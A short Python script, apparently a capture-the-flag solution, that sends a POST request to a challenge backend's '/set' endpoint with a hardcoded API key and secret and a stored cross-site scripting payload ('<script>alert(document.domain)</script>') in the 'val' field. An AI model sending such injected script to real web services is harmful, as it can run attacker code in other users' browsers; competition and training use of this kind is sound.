import requests as r

print(r.post('http://vaultify-backend.chalz.nitectf2024.live:80/set', data={
    'status': True,
    'apiKey': 'aeaab5b046a792ec8b884cc8174f843a',
    'val': '<script>alert(document.domain)</script>',
    'secret': '012123456789abcdef0123456789abcdefg',
    'updateTime': 1733994449962
}).text)
